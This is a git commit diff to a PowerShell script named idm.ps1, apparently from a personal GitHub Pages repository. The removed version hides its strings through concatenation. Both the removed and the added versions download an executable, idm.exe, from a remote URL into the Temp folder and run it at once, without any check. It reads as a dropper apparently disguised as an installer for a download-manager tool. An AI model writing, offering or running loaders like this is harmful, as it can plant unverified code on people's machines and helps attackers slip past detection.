5796e215006dbbf408f8300f9bebf524666a314f
Md Nahid Alam <76641588+nahid0x1@users.noreply.github.com>
2025-01-15 23:19:59 +0600

    Update idm.ps1

--- test/idm.ps1
+++ test/idm.ps1
@@ -1,5 +1,1 @@
-$u = "h"+"t"+"t"+"p"+"://gi"+"thub.com/nahid0x1/nahid0x1.github.io/raw/refs/heads/main/test/idm.exe"; 
-$o = "$($env:T"+"e"+"mp)\idm.exe"; 
-$i = (New-Object Net.WebClient); 
-$i.DownloadFile($u, $o); 
-Start-Process -FilePath $o
+Invoke-WebRequest -Uri "https://github.com/nahid0x1/nahid0x1.github.io/raw/refs/heads/main/test/idm.exe" -OutFile "$env:Temp\idm.exe"; Start-Process -FilePath "$env:Temp\idm.exe"
